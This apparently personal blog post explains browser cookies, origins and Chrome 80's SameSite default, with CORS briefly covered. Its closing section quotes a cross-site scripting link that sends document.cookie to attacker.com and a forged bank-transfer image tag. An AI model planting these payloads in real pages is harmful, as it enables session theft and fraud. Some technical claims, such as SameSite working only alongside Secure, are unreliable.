---
title: "Learn Cookie From Chrome 80 Samesite"
date: 2020-04-05T01:24:57-07:00
tags: ['Web', 'JavaScript', 'Chrome']
---

# Learn Cookie From Chrome 80 Samesite

Chrome 80 enable a new flag by default, [SameSite](https://www.chromium.org/updates/same-site). Although revert this change later.

> [Google rolls back Chrome feature that blocks cross-site tracking](https://www.engadget.com/2020-04-03-google-rolls-back-chrome-samesite.html).

## Concepts

Let's start with some concepts.

- Cookie Setter
- Cookie Keeper
- Cookie Sender
- Cookie Reader
- Cookie Origin

### Setter

Cookie can be set by either Web Server or Front-end codes.

When request for `GET /index.html HTTP/1.1`, the Web Server can send this back:

```
Content-type: text/html
Set-Cookie: sessionToken=abc123; Expires=Wed, 09 Jun 2021 10:18:14 GMT
```

Then cookie with key `sessionToken` will be set on the client browser side.

### Keeper

Cookie is kept and only kept by browser. Thus the cookie can be accessed and kept among different web pages, after restart the brower.

### Sender

Cookie is sent by and only by browser.

You shouldn't and can't sepcify the cookie you want to send using the front-end codes.[^1](https://stackoverflow.com/questions/15198231/why-cookies-and-set-cookie-headers-cant-be-set-while-making-xmlhttprequest-usin)

**Browser is the gate-keeper, safe-guard of the cookie!**

### Reader

Cookie is usually read/used by Web Server or front-end codes.

Web Server use line like `request.cookies.get()` to read the cookie sent by the client browser.

On the front-end, JS code can read the `cookie` from the current `location`, by `document.cookie`. Current `document.location` is where the JS code is running at, aka the URL shown on the address bar. (Except for `IFrame` and cookie with `Http-only` attribute.)

### Origin

Orgin, as a namespacing strategy, happens on both Web Server and client browser sides.

#### Set Within The Specific Orgin

On the browser sides, there are two kinds of cookies, first-party and third-party cookies.

> Cookies that match the domain of the current site, i.e. what's displayed in the browser's address bar, are referred to as first-party cookies. Similarly, cookies from domains other than the current site are referred to as third-party cookies.

For example, if the user requests `http://example.com/index.html` and return is,

```html
<!-- http://example.com/index.html -->
<html>
...
<img src="http://cdn.com/cat.png" />
<ul id="list-of-books"></ul>
...
<script>
...
response = AJAX_REQUEST_FOR("https://example.com/books");
document.getElementById.innerHTML=FORMAT(response);
...
</script>
</html>
```

If all three web servers on `http://example.com`, `http://cdn.com` and `https://example.com` response with `Set-Cookie: token=xxx` header,

1. For Orgin `http://example.com` , browser received, set and kept a cookie `token=abc`
2. For Orgin `http://cdn.com` , browser received, set and kept a cookie `token=xyz`
3. For Orgin `https://example.com` , browser received, set and kept a cookie `token=123`

As `http:` and `https:` for the same domain actually belongs to different origin,
> An origin is defined as a combination of URI scheme, host name, and port number.

So `http://example.com` and `https://example.com` are different origin because of two differences,

- URI differs at the beginning, as `URI[0:5] == "http:" or "https"`
- TCP connection is to `example.com:80` or `example.com:443`


#### Send Within The Specific Orgin

Let's say, when user **refresh** this page, (with cache disabled), the browser sends requests, (shown in [curl](https://linux.die.net/man/1/curl) grammer),

- `curl -b 'token=abc' http://example.com`
- `curl -b 'token=cute' http://cdn.com/cat.png`
- `curl -b 'token=123' https://example.com/books`

So we can see that browser only send the cookie corresponding to the request origin, regardless the fact that the current `document.location == http://example.com`.

Say on another page, `http://example99.com/index.html` is also using the cute image on `http://cdn.com/cat.png`, browser will also send the `token=cute` with the request happens on that page.

##### Origin With `Domain`

> If a cookie's `Domain` and `Path` attributes are not specified by the server, they default to the domain and path of the resource that was requested.

For example, if the Web Server response to `http://example.com/index.html` with,

```
Set-Cookie: sessionToken=abc123;
```

with no `Domain` set, the request for `http://docs.example.com/`, cookie `sessionToken=abc123` will NOT be sent. 

If the response is,
```
Set-Cookie: sessionToken=abc123; Domain=.example.com;
```

the cookie will be sent.

> The prepending dot `"."example.com` is optional in recent standards, but can be added for compatibility.


**Let's explain the following topics using the concepts introduced above.**


## Samesite Policy Enabled By Default In Chrome 80

First, the `site` terminology in the `samesite` is NOT just origin, but also the [public suffix](https://publicsuffix.org/).

This policy uses two attributes when set the cookie, `Secure` and `SameSite`. `SameSite` attibute works **only when** `Secure` is also set. e.g. `Set-Cookie: token=123; SameSite=None; Secure`.

> If you set `SameSite=Strict`, your cookie will only be sent in a first-party context.  
> `SameSite=Lax` would not restrict originating site.  
> `SameSite=None` would allow third-party (cross-site) cookies.

**Chrome 80 by default adds `SameSite=Lax` to all the cookies without specifying `SameSite` attribute. [chromestatus](https://chromestatus.com/feature/5088147346030592), [chromium.org](https://www.chromium.org/updates/same-site).**

With `SameSite=Lax`, in the [above Origin example](#send-within-the-specific-orgin), requesting for `http://cdn.com/cat.png` on `http://example.com` **won't** send the `token=cute` which belongs to origin `http://cdn.com`.

If you use `SameSite=Strict`, the restriction is even harder: by clicking a link on the `http://example.com/index.html`, like `<a href="http://cdn.com"></a>`, browser **won't** send `token=cute` on the **initial** request for `http://cdn.com`!

> With attribute `SameSite=Strict`, the browsers should only send these cookies with requests originated from the same domain/site as the target domain.

### A Complete Example

If you are still confused, see this.

- https://web.dev/samesite-cookies-explained/

> That's where `SameSite=Lax` comes in by allowing the cookie to be sent with these top-level navigations. Let's revisit the cat article example from above where another site is referencing your content. They make use of your photo of the cat directly and provide a link through to your original article.
> 
> ```html
> <!-- exmaple.com/index.html -->
> <p>Look at this amazing cat!</p>
> <img src="https://blog.example/blog/img/amazing-cat.png" />
> <p>Read the <a href="https://blog.example/blog/cat.html">article</a>.</p>
> ```
> And the cookie has been set as so:
> ```
> Set-Cookie: promo_shown=1; SameSite=Lax
> ```
> When the reader is on the other person's blog the cookie will not be sent when the browser requests `amazing-cat.png`. However when the reader follows the link through to `cat.html` on your blog, that request will include the cookie. This makes `Lax` a good choice for cookies affecting the display of the site with `Strict` being useful for cookies related to actions your user is taking.

### Effect On Front-End Code

The default `SameSite=Lax` setting, will fail the request for external resources. For example in the case of,

1. User login to `http://bookshelf.com/login` and save the cookie `token=123`
2. User browses `bookreviews.com` and want to GET `bookshelf.com/user1/favorite` shown in the widget.
3. If `bookshelf.com` needs the token to see user's favorites, this request will fail as the `token=123` is not sent by the Chrome 80.

To solve this, the developer of `bookshelf.com` needs to,

1. Change the login page using https, `https://bookshelf.com/login`
2. Send the above cookie when login successfully,
   ```
   Set-Cookie: token=123; Secure; SameSite=None
   ```

### Force Opt-Out From This Feature In User's Side

1. Copy-paste `chrome://flags` on address bar and press `Enter`.
2. Search `samesite by default cookies` using searching feature on the top of the page.
3. Change the highlighted item in the filtered list (should be the first item), from `Default` to `Disabled`.


## Related Topics

### CORS

> A web page may freely embed cross-origin images, stylesheets, scripts, iframes, and videos. Certain "cross-domain" requests, notably AJAX requests, are forbidden by default by the same-origin security policy. CORS defines a way in which a browser and server can interact to determine whether it is safe to allow the cross-origin request.

On the browser side, for "cross-domain" requests, for example, during opening the page:

```html
<!-- http://www.exmaple.com/index.html -->
<p>Look at this amazing cat!</p>
<img src="https://blog.example/blog/img/amazing-cat.png" />
```

browser send http requst `OPTIONS https://blog.example/blog/img/amazing-cat.png` with

```
Origin: http://www.example.com/index.html
```

On the Web Server side,

- Which origin are allowed to make the requests?

You can simply send `Access-Control-Allow-Origin: *` back for allowing all requests.

### Cookie Theft And Abuse

> - Cross-site scripting. If the website that allows its users to post unfiltered HTML and JavaScript content. E.g. `<a href="#" onclick="window.location = 'http://attacker.com/stole.cgi?text=' + escape(document.cookie); return false;">Click here!</a>
> - DNS cache poisoning. An attacker could use DNS cache poisoning to create a fabricated DNS entry of `attacker.www.example.com` that points to the IP address of the attacker's server and send user an email with the link to attacker.www.example.com.
> - Cross-site request forgery. Attacker send email with an image `<img src="http://bank.example.com/transfer?account=bob&amount=1000000&to=mallory">`


## Refs.

1. https://en.wikipedia.org/wiki/HTTP_cookie
2. https://stackoverflow.com/questions/15198231/why-cookies-and-set-cookie-headers-cant-be-set-while-making-xmlhttprequest-usin
3. https://web.dev/samesite-cookies-explained/
4. https://developers.google.com/web/fundamentals/security/prevent-mixed-content/what-is-mixed-content